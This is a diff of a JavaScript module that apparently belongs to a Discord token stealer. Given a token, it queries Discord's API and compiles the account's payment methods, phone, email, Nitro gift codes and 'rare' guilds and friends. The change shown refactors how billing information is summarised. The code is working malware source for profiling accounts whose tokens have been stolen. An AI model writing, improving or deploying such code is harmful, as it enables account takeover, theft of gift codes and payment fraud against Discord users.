@@ -170,11 +170,12 @@ module.exports = (token) => {
     getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
     getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token)
   ];
-  const p = payment.reduce((acc, s) => {
-    if (s.brand && s.invalid === 0) acc.push(emojis.user.payments[0]);
-    if (s.email) acc.push(emojis.user.payments[1]);
-    return acc;
-  }, []).join('');
+
+  var p = payment?.reduce((a, e) => {
+    if (e.brand && !e.invalid) a += emojis.user.payments[0];
+    if (e.email) a += emojis.user.payments[1];
+    return a;
+  }, '') || 'No Found';
   
   const g = entitlements.length > 0 ? entitlements.map(s => `${s}, `).join('') : "Nitro Gifts Codes Not Found";
   return {
@@ -202,16 +203,16 @@ module.exports = (token) => {
       bio: user.bio || "Bio Not Found",
       phone: user.phone || "Phone Not Found",
       mail: user.email,
-      billing: p || "Billing Not Found",
+      billing: p,
       langue: getLanguage(settings.locale),
       status: getStatusEmoji(settings.status),
       theme: getTheme(settings.theme),
       gifts: getGiftsCodes(token, settings)
-    }, 
+    },
     guilds: {
       all: getGuilds(guilds).all,
       rares: getGuilds(guilds).rare
-    }, 
+    },
     friends: {
       all: "Unfinished",
       rares: rareFriend(relationships)
